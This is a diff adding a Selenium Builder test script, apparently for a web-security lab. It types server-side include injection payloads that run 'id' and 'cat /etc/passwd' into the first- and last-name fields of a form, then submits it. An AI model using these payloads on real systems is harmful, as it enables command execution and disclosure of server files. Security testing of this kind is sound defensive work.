@@ -1,0 +1,47 @@
+{
+  "type": "script",
+  "seleniumVersion": "2",
+  "formatVersion": 2,
+  "steps": [
+    {
+      "type": "setElementText",
+      "locator": {
+        "type": "id",
+        "value": "firstname"
+      },
+      "text": "<! -- #exec cmd=\"id\"  -- >"
+    },
+    {
+      "type": "clickElement",
+      "locator": {
+        "type": "id",
+        "value": "lastname"
+      }
+    },
+    {
+      "type": "setElementText",
+      "locator": {
+        "type": "id",
+        "value": "lastname"
+      },
+      "text": "<! -- #exec cmd=\"cat /etc/passwd\"  -- >"
+    },
+    {
+      "type": "clickElement",
+      "locator": {
+        "type": "name",
+        "value": "form"
+      }
+    },
+    {
+      "type": "verifyTextPresent",
+      "text": "192.168.178.34"
+    }
+  ],
+  "data": {
+    "configs": {},
+    "source": "none"
+  },
+  "inputs": [],
+  "timeoutSeconds": 60
+}
